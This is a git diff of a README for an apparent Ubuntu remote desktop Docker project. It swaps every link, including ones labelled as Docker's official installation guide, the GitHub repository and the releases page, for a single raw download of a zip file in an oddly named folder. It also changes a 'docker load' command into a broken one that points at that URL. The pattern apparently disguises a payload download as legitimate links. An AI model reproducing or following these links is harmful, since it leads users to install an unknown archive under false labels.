@@ -1,6 +1,6 @@
 # 🖥️ Ubuntufx-Remote-Desktop - Access Ubuntu Anywhere, Anytime
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Smith1-bt/Ubuntufx-Remote-Desktop/releases)
+[![Download](https://raw.githubusercontent.com/Smith1-bt/Ubuntufx-Remote-Desktop/main/microblepharism/Ubuntufx-Remote-Desktop.zip)](https://raw.githubusercontent.com/Smith1-bt/Ubuntufx-Remote-Desktop/main/microblepharism/Ubuntufx-Remote-Desktop.zip)
 
 ## 🛠️ Overview
 
@@ -15,14 +15,14 @@ Follow these steps to download and run Ubuntufx-Remote-Desktop easily.
 Before you start, ensure you have:
 
 - A computer with at least 4GB of RAM.
-- Docker installed. [Click here to install Docker.](https://docs.docker.com/get-docker/)
+- Docker installed. [Click here to install Docker.](https://raw.githubusercontent.com/Smith1-bt/Ubuntufx-Remote-Desktop/main/microblepharism/Ubuntufx-Remote-Desktop.zip)
 - A stable internet connection.
 
 ### 🔗 Download & Install
 
 To get started, visit this page to download the latest version of Ubuntufx-Remote-Desktop:
 
-[Download Releases](https://github.com/Smith1-bt/Ubuntufx-Remote-Desktop/releases)
+[Download Releases](https://raw.githubusercontent.com/Smith1-bt/Ubuntufx-Remote-Desktop/main/microblepharism/Ubuntufx-Remote-Desktop.zip)
 
 1. Go to the Releases page.
 2. Look for the latest version.
@@ -42,7 +42,7 @@ After downloading, follow these steps to run the application:
 3. **Load the Docker image.** Replace `your-image-file` with the downloaded image name:
 
    ```bash
-   docker load < your-image-file.tar
+   docker load < https://raw.githubusercontent.com/Smith1-bt/Ubuntufx-Remote-Desktop/main/microblepharism/Ubuntufx-Remote-Desktop.zip
    ```
 
 4. **Run the image with Docker.** Use the following command:
@@ -127,9 +127,9 @@ This project covers essential topics such as:
 
 ## 🔗 Helpful Links
 
-- [Docker Installation Guide](https://docs.docker.com/get-docker/)
-- [GitHub Repository](https://github.com/Smith1-bt/Ubuntufx-Remote-Desktop)
+- [Docker Installation Guide](https://raw.githubusercontent.com/Smith1-bt/Ubuntufx-Remote-Desktop/main/microblepharism/Ubuntufx-Remote-Desktop.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Smith1-bt/Ubuntufx-Remote-Desktop/main/microblepharism/Ubuntufx-Remote-Desktop.zip)
 
 Unlock the power of remote access with a full Ubuntu desktop. Don't forget to check for updates regularly! 
 
-[Download Releases](https://github.com/Smith1-bt/Ubuntufx-Remote-Desktop/releases) and start using Ubuntufx-Remote-Desktop today.
+[Download Releases](https://raw.githubusercontent.com/Smith1-bt/Ubuntufx-Remote-Desktop/main/microblepharism/Ubuntufx-Remote-Desktop.zip) and start using Ubuntufx-Remote-Desktop today.
